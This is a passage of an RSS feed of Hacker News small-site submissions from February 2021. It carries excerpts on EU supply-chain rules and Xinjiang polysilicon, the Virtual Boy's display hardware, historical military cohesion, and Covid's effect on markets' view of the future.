<p>The Commission is working on <a href="https://www.politico.eu/?p=1496802">a new tool</a> — due diligence legislation — which would make EU companies accountable if their suppliers breach labor and climate laws. But MEPs would like the Commission to go even further to tackle serious situations such as the one in Xinjiang. Last month, the European Parliament’s legal affairs committee <a href="https://www.politico.eu/?p=1590418">called on</a> the Commission to introduce an import ban for “products related to severe human rights violations.”</p>



<p>“The EU due diligence legislation has a key role to play in that as it will help ensure that human rights are respected throughout our supply chains,” said MEP Cavazzini. She backs an import ban if suppliers are shown to be involved in human rights abuses.</p>



<p>The Commission is <a href="https://ec.europa.eu/info/law/better-regulation/have-your-say/initiatives/12548-Sustainable-corporate-governance" target="_blank">set to</a> come up with its supply chain responsibility proposal by June after a public consultation ended this week.</p>



<p>According to Justice Commissioner Didier Reynders, who is in charge of the file, new rules are likely to focus on so-called Tier 1 suppliers and to make reference to the International Labor Organization’s core conventions, which China committed to ratify under the new investment deal concluded with the EU.</p>



<p>“Expanding the use of renewables is of utmost importance in order to stop the climate crisis. But it cannot come at the cost of human rights,” said Cavazzini.</p>



<p><em>Want more analysis from </em><span>POLITICO</span><em>? </em><span>POLITICO</span><em> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#83f3f1ecc3f3ecefeaf7eae0ecade6f6" target="_blank"><span data-cfemail="90e0e2ffd0e0fffcf9e4f9f3ffbef5e5">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119752</guid>
            <pubDate>Fri, 12 Feb 2021 23:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calvin and Hobbes Search Engine]]>
            </title>
            <description>
<![CDATA[
Score 322 | Comments 122 (<a href="https://news.ycombinator.com/item?id=26119380">thread link</a>) | @bookofjoe
<br/>
February 12, 2021 | http://michaelyingling.com/random/calvin_and_hobbes/ | <a href="https://web.archive.org/web/*/http://michaelyingling.com/random/calvin_and_hobbes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://michaelyingling.com/random/calvin_and_hobbes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119380</guid>
            <pubDate>Fri, 12 Feb 2021 22:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual Boy Architecture: A Practical Analysis]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26117584">thread link</a>) | @strangecasts
<br/>
February 12, 2021 | https://www.copetti.org/writings/consoles/virtual-boy/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/virtual-boy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><div><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul><div><div id="cover-motherboard"><figcaption>The mainboard<br>Not to be confused with the 'Servo board' which the mainboard connects to.<br>Virtual Sound Unit IC, 128 KB of DRAM and 64 KB of PSRAM are fitted on the back.</figcaption></div><div id="cover-diagram"><a href="https://www.copetti.org/images/consoles/virtualboy/diagram.png"><picture>
<img width="1185" height="1062" alt="Diagram" loading="auto" src="https://www.copetti.org/images/consoles/virtualboy/diagram.png"></picture></a><figcaption>Notice how the two screenshots have its background scenery slightly shifted horizontally</figcaption></div></div></div><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>A console often summarised by its short lifespan and limited colour space. While technically correct, I believe these attributes tend to overlook other surprising properties.</p><p>In this article, I invite readers to learn more about its internal features, many of which became predominant in the market only after the Virtual Boy’s discontinuation.</p><hr><h2 id="display">Display</h2><p>The whole system is a curious piece of engineering. Externally, it resembles a bulky VR headset on a bipod. The player must place their head close to the eyepiece to see the game in action.</p><div><a href="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png"><picture>
<img name="image_cover" alt="Image" width="1111" height="526" src="https://www.copetti.org/images/consoles/virtualboy/case/front.f5ed2bf56afcaf7238bb81e26e42ea66a11e68a40b14581affc282e9ee25c268.png" loading="auto"></picture></a><figcaption>This is as far as I get trying to shoot a photo of the display and the case at the same time. In reality, games look very crisp and in full size!</figcaption></div><p>Internally, it’s a whole different story (and a very complicated one too). For this reason, I thought it would be better to start by explaining how this console displays images and then go through the internal hardware.</p><h4 id="projecting-an-image">Projecting an image</h4><p>Once you switch the Virtual Boy on, you will start seeing two <strong>monochromatic red</strong> pictures (one for each eye) through the eyepiece. So far so good? Well, here is the interesting part: <strong>This console doesn’t have a screen</strong>, so what you see is more of an ‘illusion’ - Let’s dive deeper to know what’s going on.</p><p>The topics involved in explaining this (optics, visual phenomenons, etc) may feel difficult at first, but I constructed some interactive animations to make this section little more immersive.</p><div><ul><li id="tab-2-1-scanner-link"><a href="#tab-2-1-scanner">Scanner</a></li><li id="tab-2-2-mechanics-link"><a href="#tab-2-2-mechanics">Mechanics</a></li><li id="tab-2-3-display-link"><a href="#tab-2-3-display">Display</a></li><li id="tab-2-4-active-periods-link"><a href="#tab-2-4-active-periods">Active periods</a></li></ul><div><div id="tab-2-1-scanner"><h4>Scanner</h4><p>The large volume of this console can be attributed to the <strong>Scanner</strong>, which fills up a big part of it. The Scanner is the area of the Virtual Boy that displays images. It’s composed of two <strong>Display units</strong>, each one independently projects a frame (giving a total of two frames, one per eye).</p><p>A Display unit is where all the ‘magic’ happens, it’s made of the following components:</p><ul><li>An <strong>LED Unit</strong>: Contains 224 red LEDs stacked vertically and the necessary circuitry to control each one of them.</li><li>A <strong>Lens</strong>: Refracts the light coming from the LEDs.<ul><li>At the top of the Virtual Boy’s case, there is a <strong>Focus slider</strong> used to shift the lenses closer or further away from the LEDs. This allows the user to adapt the console to their focal length (preventing blurry images).</li></ul></li><li>A <strong>Mirror</strong>: Reflects the light coming from the lens and directs them to the user’s eyes. Furthermore, this component will be constantly oscillating thanks to a <strong>Voice coil motor</strong> connected to it. The motor is managed by the <strong>Servo control</strong>, a separate board which sends electrical pulses at 50 Hz.<ul><li>All in all, this is a very complex and fragile area of the console, so there’s a photo interrupter (a type of photosensor) installed. This reports the oscillation observed from the mirror to the Servo control, which in turns monitors the oscillations and applies the necessary corrections.</li></ul></li></ul><p>Next to the focus slider there is a <strong>IPD dial</strong> (knob-shaped switch), which adjust the distance between the two Display units. This is done to adapt the displays to the user’s inter-pupil distance.</p></div><div id="tab-2-2-mechanics"><h4>Mechanics</h4><div><figcaption>Basic representation of the angle of the oscillating mirror over time (at a very slow motion)<br>The left and right LEDs are operating (active) during the red and blue period, respectively<br>During the grey period, no LED is operating (idle)<br>For sake of simplicity, the angular velocity represented here is constant (but not in the real world)</figcaption></div><p>Now that we have each component identified, let’s take a look how the Virtual Boy manages to show images to our eyes.</p><p>If you haven’t noticed before, there <strong>isn’t any dot-matrix display to be found</strong>, so why are we seeing two-dimensional images from the eyepiece? Similarly to the functioning of a CRT monitor, Display units play with the way we perceive images:</p><ul><li>The fact the mirrors oscillate enables a single column of LEDs to displace horizontally between our field of view. The angle of the mirror is strategically directed to place the LEDs on 384 different ‘column positions’ distributed across our field of view.</li><li>Human vision is logarithmic and the mirror oscillates at <strong>50 Hz</strong> (each period takes 20 ms). This is so fast we end up perceiving 384 columns of LEDs illuminating at the same time (afterimage effect) until the mirror stops oscillating.</li><li>All of this is perfectly synchronised with the LED controller, which updates each LED bulb every time the mirror is slightly moved. Thus, we end up seeing a full picture coming from the eyepiece.</li></ul><p>In practice, there are some conditions for all these principles to work:</p><ul><li>The LEDs must only operate when the angular velocity of the mirror is stable (in other words, not when the mirror is changing direction). This can be thought of as the <a href="https://www.copetti.org/writings/consoles/master-system/#tab-2-4-result"><strong>Active State</strong></a> of a CRT monitor.</li><li>In relation to the previous point, the angular velocity of the mirror can’t stay constant (since the mirror can’t change direction instantly, the periods considered ‘stable’ will be subject to forces that will disrupt its velocity). To remedy this, the Virtual Boy stores a list of values in memory called <strong>Column Table</strong> which instructs how much time to dedicate for each column interval, in an effort to balance out excessive &amp; insufficient periods of ‘LED column’ exposure.</li><li>Let’s not forget that this whole process has to be done twice since we got two display units (one per eye). Unfortunately, both units can’t pull energy and data at the same time, so each one operates at different display periods (out-of-phase, 10ms apart). We don’t notice this (another illusion!).</li></ul></div><div id="tab-2-3-display"><h4>Display</h4><div><figcaption>Simplified representation of how the first LED unit operates during specific periods of time. Notice how the LEDs will start displaying each column of the frame-buffer during active periods.</figcaption></div><p>Contrary to previous video chips modelled after CRT displays (i.e. <a href="https://www.copetti.org/writings/consoles/nes/#graphics">PPU</a> and <a href="https://www.copetti.org/writings/consoles/master-system/#graphics">VGP</a>), graphics on the Virtual Boy are <strong>not rendered on-the-fly</strong>. The graphics chip on this console sends the processed frame to a frame-buffer in memory, each column of the frame is then sent to the LED array for display.</p><p>Once the Servo board detects it’s time for display, the graphics chip will start sending columns of pixels from the frame-buffer to those 224 vertically-stacked LEDs, one-by-one in a strategically synchronised matter so the LEDs will have shown 384 columns during the display period. Hence, the ‘screen resolution’ of this console is 384x224 pixels.</p><p>Moreover, we need to store two frame-buffers since each one will go to a different display unit. The graphics subsystem also employs double-buffering and other quirks (mentioned later in the ‘Graphics’ section). So, for now, just remember how a digital frame is sent to the LEDs.</p></div><div id="tab-2-4-active-periods"><h4>Active periods</h4><div><figcaption>Another simplified animation, this time showing how the oscillation of the mirror deviates the LEDs light in a way the user will end up seeing a proper frame</figcaption></div><p>Consequently of this design, there are going to be periods of:</p><ul><li><strong>Active Display</strong> during which the LEDs are pulling an image from the frame-buffer and nothing can disrupt it.</li><li><strong>Active Display 2</strong>: Same as before but now the other Display unit is operating.</li><li><strong>Drawing idle</strong>: A period where none of the LEDs are operating and the angular velocity of the mirror is unstable.</li></ul><p>This cycle is repeated 50 times per second (hence the 50 Hz refresh rate). That means that for every frame, the CPU and GPU would have around 10ms worth of time to update the picture that the user will see. In reality, Nintendo’s engineers implemented something more sophisticated. Again, I’ll try to explain this with more depth in the ‘Graphics’ section. But for now I hoped you got a good understanding of how the Virtual Boy cleverly managed to produce a picture with inexpensive hardware.</p></div></div></div><p>This has been a quick explanation of how optics can turn a single vertical line into a picture. If you own or have read about the Virtual Boy before, you may be wondering when the three-dimensional imagery takes place. I just want to make it clear that none of the previous explanation have a connection with that effect. I’m mentioning this because in the past I’ve seen many places arguing that the oscillating mirrors are the cause of the ‘depth perception’, however, with all the information I’ve gathered in this study, I don’t think that claim is accurate.</p><p>That being said, I think it’s time we discuss the 3D phenomenon…</p><h4 id="creating-a-third-dimensional-vision">Creating a third-dimensional vision</h4><p>During the marketing of the Virtual Boy, there was a lot of fanfare regarding the fact this console could project a ‘3D world’. I’m not referring to images with 3D polygons stamped (like the other 5th gen. consoles), but the actual perception of depth.</p><p>In a nutshell, the Virtual Boy relies on <strong>Stereoscopic images</strong> to carry out that illusion. So this system wasn’t only capable of toying with our vision to project a full image, but it also did it in a way we would think certain drawings are closer/far away from others!</p><div><div><figcaption>Snapshot of the game seen from the different display units<br>Mario's Tennis (1995)</figcaption></div><p>The technique is very simple: Each of the two frames displayed (one on each eye) will have some elements slightly shifted horizontally, so when we try to see them with our two eyes, our brain will think they are nearer than others. This depends on the direction the elements are shifted.</p><p>Objects shifted towards the centre of your eyes (moved right on the left frame and moved left on the right frame) will appear closer, objects shifted away from the center of your eyes will appear further away. Finally, objects with no shifting will appear between the two other. This approach is called <strong>Stereoscopic parallax</strong>.</p></div><p>One of the drawbacks of stereoscopy is <strong>eyestrain</strong>. This was alleviated by the fact games provided an ‘automatic pause’ system which reminded the user to take breaks every 30 min. Nintendo also wrote down various warning messages in their packaging and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/virtual-boy/">https://www.copetti.org/writings/consoles/virtual-boy/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/virtual-boy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117584</guid>
            <pubDate>Fri, 12 Feb 2021 19:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Universal Warrior, Part IIb: A Soldier’s Lot]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26117386">thread link</a>) | @parsecs
<br/>
February 12, 2021 | https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the continuation of the second part of a three part (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, III) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p><a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">We started this section last week </a>by looking at the forms of war along with the direct emotional experience of combat.  What we found is that, quite to the contrary of there being just one sort of war that ‘never changes,’ there are in fact multiple <em>systems</em> of war that function quite differently (with considerable variation both within and between those systems) to the point that armies often find opponents working from within a different system of war almost utterly alien to them.</p>



<p>Moreover, as we discussed, the experience of battle, not merely the technology, tactics and circumstances, but the <em>raw emotional experience</em> (taken in terms of courage and fear) wasn’t constant either.  Different cultures understood ‘courage’ differently (and we must remember that translation here can be deceiving – most of them didn’t understand ‘courage’ at all, they understood <em>andreia</em> or <em>fortis </em>or <em>corage</em> or <em>der Mut</em> or <em>woohitike</em> which are, in the end, subtly different things and so not quite ever exactly courage at all) and different battles imposed different sorts of fear which strained those combatants in different ways.</p>



<p>Now we’re going to keep soldiering on and look at some of the other factors of the war experience: the importance of comrades, the drudgery and toil of war, and of course wounds (both physical and mental) and their healing.  Once again, to abuse the opening lines of the <em>Fallout</em> series, we going to ask if it is really true that “War, war never changes.”</p>



<figure><img data-attachment-id="6241" data-permalink="https://acoup.blog/fallout-4/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png" data-orig-size="1055,578" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fallout-4" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/02/fallout-4.png 1055w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The iconic introduction line from all of the Fallout games (this is the version from Fallout 4.<br>As we’re going to see, this <strong>sounds</strong> true, but isn’t.  War changes quite a lot.</figcaption></figure>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>The Ties that Bind</h2>



<p>What about the personal relationships that are formed in the context of conflict?  Surely, the ‘band of brothers’ is a truly universal experience, right (<a href="https://youtu.be/76_Q9ruJfrE">but note on the complexities of Shakespeare’s <em>Henry V</em></a>)?  Surely the social bonds that held<a href="https://en.wikipedia.org/wiki/Band_of_Brothers_(miniseries)"> Easy-Company</a> together in 1944 and 1945 are the same as those from 1415?  Or 415?</p>



<p>Well, no.  Not quite.</p>



<p>We can approach this question through the idea of cohesion – the moral force that holds a group of combatants together on the battlefield under the intense emotional stresses of combat.  The intense bonds that soldiers form in modern armies (particularly those in the European pattern) are not an accident, but a core part of how those armies, institutionally, seek to build cohesion.  Going back to last week, we discussed briefly the emergence of the extensively drilled and disciplined ‘mechanical’ soldier of Early Modern Europe, noting that this approach wasn’t necessary for the effective use of firearms (the Ottoman Janissaries, for instance, were quite good with firearms, but were not trained and organized in this way), but rather was a product of elite aristocratic (read: officer) disdain for their up-jumped peasant soldiers and thus the assumption by those aristocrats that the only way to get such men to fight effectively was to relentlessly drill them.</p>



<figure><img data-attachment-id="6231" data-permalink="https://acoup.blog/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg" data-orig-size="723,351" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="hohenfriedeberg_-_attack_of_prussian_infantry_-_1745" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" src="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=723" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg 723w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/02/hohenfriedeberg_-_attack_of_prussian_infantry_-_1745.jpg?w=300 300w" sizes="(max-width: 723px) 100vw, 723px"><figcaption><a href="https://en.wikipedia.org/wiki/Prussian_Army#/media/File:Hohenfriedeberg_-_Attack_of_Prussian_Infantry_-_1745.jpg">Via Wikipedia</a>, the Attack of Prussian Infantry, 4 June 1745 by Carl Röchling (1855-1920)</figcaption></figure>



<p>Now the funny thing about this system is that it clearly <em>worked</em>, but not for the reasons its aristocratic pioneers believed.  It was only really after the Second World War that systematic study began to be made of unit cohesion (e.g. S.L.A. Marshall, <em>Men Against Fire</em> (1947), though subsequent literature on the topic is voluminous and Marshal’s work has its problems, but its conclusions are broadly accepted having been confirmed in subsequent studies).  What emerged quite clearly was that it wasn’t ‘the cause’ or patriotism that held troops together under fire, but group cohesion born out of an intense need not to let fellow soldiers in the unit down.  In short, what held units together and made them fight more effectively was (in part, there are many conclusions in <em>Men Against Fire</em>) the strong social bonds between comrades.</p>



<p>And, in fact, the drill and discipline of early modern European armies unintentionally did quite a lot of cohesion building things.  Soldiers were removed from civilian society (isolation from larger groups builds unit cohesion), split into very small groups (keeping the core group that coheres below <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar’s number</a> aids in group cohesion; thus <a href="https://youtu.be/a15gihWu1SM">why the platoon is a natural unit size</a>) and then pushed through difficult and unpleasant training (that drill and discipline) creating a sense of unique shared experience and sacrifice.  All of which doesn’t render men <em>machines</em>, but it does create strong social bonds within the units that will keep the men fighting even when they care little for their cause (which they generally did in this period; one does not find a super-abundance of patriotism among, say, the Army of Flanders).</p>



<p>And there is a tendency to point to this cohesion, its modern source in ‘toughening’ boot camp and to say, ‘aha!  That is the true universal about effective soldier-warriors!’  Except – and you knew there was going to be an except – except it isn’t.  Systems built on the use of drill and discipline for the development of unit cohesion through social bonds are actually, historically speaking, quite rare.  We see systems like that in use by the Romans from the Middle Republic forward (but significantly faded by the end of late antiquity; the Byzantine army doesn’t seem to function this way), in China from the Han Dynasty onward, in Japan for the <em>ashigaru</em> infantry from the Sengoku period, and in Europe from the Early Modern period.  That <em>sounds</em> like a lot, but that is relatively small minority of the historical period and even then in a relatively small minority of places.  It is, for instance, a period that only covers about half of the historical period in Western Europe, the place most often associated with this very system of organization (though that association is perhaps unfair to East Asia).</p>



<p>Instead, most societies relied on existing social bonds formed <em>outside</em> of the experience of war for cohesion.  Greek hoplite armies, for instance, generally formed up by <em>polis</em> (read: city) and then within those blocks by still smaller and smaller social divisions, so that family and neighbors would be standing shoulder to shoulder in the battle line (Sparta does this through the system of communal messes, the <em>syssitia</em>, but the idea that you fought alongside the men you dined with socially – your neighbors, generally – was perfectly normal in most Greek cities).  That was intentional – it allowed the phalanx to cohere through the social pressure not to be seen as a coward before the men who meant the most to you, whose shaming gaze you would have to endure in civilian life.  The same pressures, by the well, held together the (mostly volunteer) armies of the American Civil War (on this, see, McPherson, <em>For Cause and Comrades</em> (1997)).</p>



<p>By contrast, ‘warrior’ classes often rely on a sort of class solidarity along with the demand of an individual military aristocrat to be <em>individually</em> militarily excellent.  Richard Kaeuper quips of the literature of the medieval knightly class that it was filled with “utterly tireless, almost obsessional emphasis placed on personal prowess” (R.W. Kaeuper, <em>Chivalry and Violence in Medieval Europe</em> (1999)).  We’ve talked a fair bit about the values of mounted aristocrats, both in <a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/">their </a><a href="https://acoup.blog/2020/04/10/collections-antarah-ibn-shaddad-victory-songs/">role </a>as combatants and <a href="https://acoup.blog/2020/06/12/collections-the-battle-of-helms-deep-part-vii-hanging-by-a-thread/">in their roles as generals </a>and those values are relatively disconnected from discipline-induced forms of buddy-cohesion.  Of course exactly what ‘good generalship’ or ‘good officership’ looks like varies wildly from place to place – Alexander was expected to command his cavalry from the front; Roman emperors rarely took the battlefield and when they did they commanded from the rear since it would be foolish to risk the ‘brain’ of the army in personal combat and in any event someone at the front of a cavalry charge can hardly direct the rest of the army.</p>



<p>One of the things I find most striking about the ‘warrior ethos’ advanced by writers like Pressfield is that it accepts as normal the unique nature of the bonds that hold soldiers together in battle, assuming this bond and its shared sacrifice to be at once unique to combat and also transcendent to all combatants.  But one of the key points made very well in Sebastian Junger’s <em>War </em>(2010) and later <em>Tribe</em> (2016) is just how <em><strong>strange</strong></em> that experience is, historically.  <strong>Junger notes that in earlier societies, soldiers would have returned from war into communities </strong>(often small, agricultural communities or tribal communities) <strong>every bit as close-knit as the infantry platoon – and indeed, often involving <em>literally the same people</em> as the infantry platoon</strong>.  Instead, the intense feeling of uniqueness that modern soldiers feel about the bonds of combat is because of the historically unusual deracination produced by modern societies by the industrial revolution and the post-industrial period.</p>



<p>And Junger’s point is born out quite clearly when looking at the myriad of historical societies where those non-combat social bonds were the basis of the principles of military cohesion, be it the small-town cohesion of the hoplite phalanx or the class-based-expectation cohesion of a group of knights, or (for that matter) later modern …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117386</guid>
            <pubDate>Fri, 12 Feb 2021 19:16:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Covid brought the future back]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 31 (<a href="https://news.ycombinator.com/item?id=26116488">thread link</a>) | @furtively
<br/>
February 12, 2021 | https://worksinprogress.co/issue/how-covid-brought-the-future-back/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/how-covid-brought-the-future-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>When the US joined World War Two, it set back a number of peacetime R&amp;D projects. A team at Bell Labs had been studying some interesting properties of semiconducting substances, with the hope that they might find a way to replace the then-ubiquitous vacuum tube. But the exigencies of wartime complicated their plans—for one thing, the only supplier of sufficiently pure silicon was a German company—so they took a break to focus on wartime applications like radar. By the time they returned to regular work, the war was won, the US industrial base had dramatically ramped up (now DuPont, not German suppliers, made the world’s purest silicon), and the team had acquired an encyclopedic knowledge of how substances like silicon and germanium behave.</p>
<p>Two years later, the transistor was born.</p>
<p>Crises radically reshape priorities; they cancel some projects, and accelerate others. But another effect they have is to make people more conscious of the future. To struggle through a crisis is, implicitly, to view the future as a point very much worth getting to. The Bell Labs team certainly helped build a better postwar future, and arguably Covid-19 has pushed people in the same direction.</p>
<p>We shouldn’t expect the results of this to be visible just yet. Scientific progress is visible on a lag: while the <i>New York Times</i> did mention the invention of transistors, it was midway through a column called “news of the radio,” hardly an accurate assessment of the impact of one of the twentieth century’s great inventions. Fortunately, there are more real-time ways to approximate people’s attitudes towards the future—the stock market is a real-time dollar-weighted poll about what kinds of companies will matter, and how that’s changing.</p>
<p>One of the surprising consequences of the Covid-19 pandemic was that, after a brief and fearsome decline, overall asset prices rose. That’s partly an artifact of how policymakers responded to the pandemic; pumping liquidity into the market does help offset supply shocks, and some of that money finds its way into speculative vehicles. But even <i>within</i> the market, there’s been a striking rise in investor interest in electric vehicles, autonomous cars, AI, and software companies ranging from consumer-facing companies like Facebook and Google to complex enterprise products like Snowflake.</p>
<p>The market’s judgments always have to be taken judiciously. Humans are imperfect judges of the present, not to mention the future. And as the recent GameStop fireworks demonstrate, sometimes prices can be driven more by technical aspects of market structure than by a cold and calculating assessment of the net present value of future cash flows. Even GameStop’s run-up, though, was born out of forward-looking analysis of a business, not gambling. The original thesis behind buying GameStop, before it turned into a social movement devoted to punishing hedge funds, <i>was</i> an argument that the company was fundamentally underpriced—because the market had missed its opportunity to transcend brick-and-mortar retailing and digitize its business!</p>
<p>There are definite precedents for extrapolating about new concerns from stock prices. Defense stocks rise when war is rumored to be imminent, for example, and cyclical stocks’ performance tends to change ahead of macro data on the economic cycle. More narrowly, the economist Armen Alchian <a href="https://www.sciencedirect.com/science/article/abs/pii/S0929119914000546">deduced that hydrogen bombs use lithium by tracking the stock prices of mining companies</a>.</p>
<p>Today, the world’s most valuable automaker is Tesla, with a market capitalization of $827bn, compared to $232bn for runner-up Toyota. Tesla isn’t valued based on its current production (just under 500,000 vehicles annually, compared to Toyota’s 9.2 million) or high margins (it eked out a net profit margin of just under 2%, less than half of Toyota’s results). Instead, Tesla is valued based on three forward-looking intangibles: it’s a pure-play electric vehicle company, its brand name is synonymous with clean energy rather than the more mixed reaction General Motors or Hyundai might engender, and its charismatic CEO has been able to recruit cult-like adherents to his vision of sustainable transportation and a multiplanetary species.</p>
<p>Calling Tesla is a cult isn’t pejorative, just descriptive: any organization that successfully accomplishes something that is widely believed to be impossible has to have distinctive beliefs, and any group of people who behave in unusual ways because of shared beliefs can be reasonably described as a cult. Some companies use their cultish aspects in harmful ways, but cults are a social design pattern that shows up over and over again, in successful companies and political movements. Cult-like traits are more common with companies that are growing fast—it would be hard for a steel mill or a local bank to engender this kind of behavior in its employees. It’s a way to focus everyone’s energy on the future, and avoid distracting questions about whether or not that future is viable—a way to raise the variance of outcomes, which makes extreme upside scenarios possible while increasing the odds of failure.</p>
<p>Tesla is not the only futuristic vehicle stock to be accorded a high value by the stock market. In fact, it’s arguably among the more mature. There are at least earnings to put a price/earnings multiple on, whereas many of the more recent EV companies are at an earlier stage than that. Luminar Technologies, for example, went public through a reverse merger late last year, and currently has a market value of almost $11bn. The company has minimal sales ($11m over the last nine months) and is still pouring money into R&amp;D. But LiDAR appears to be the most promising way to get cars to full autonomy, so investors are willing to value it based on the chance that a) autonomous vehicles will happen, b) they’ll use LiDAR, c) they’ll use Luminar’s systems to do it, and d) Luminar will be able to earn acceptable margins selling it.</p>
<p>The joint probability of all of those possibilities is low if they’re independent: if there’s a 10% chance of autonomous vehicles, a 10% chance they’ll use LiDAR, a 10% chance that LiDAR-using AVs will use Luminar’s technology, and a 10% chance that Luminar will get good margins, then the odds of Luminar being a good investment work out to 0.01%. But the more ambitious a company is, the more its job is to make those variables <i>conditional</i> instead: the closer a company gets to being the <i>only</i> way a given technology can happen, the more technology risk becomes synonymous with business risk, which compresses the overall range of outcomes. It also solves for the viable-business condition: if there’s just one company that can make AVs possible, then that company will have the pricing power necessary to make them profitable, too.</p>
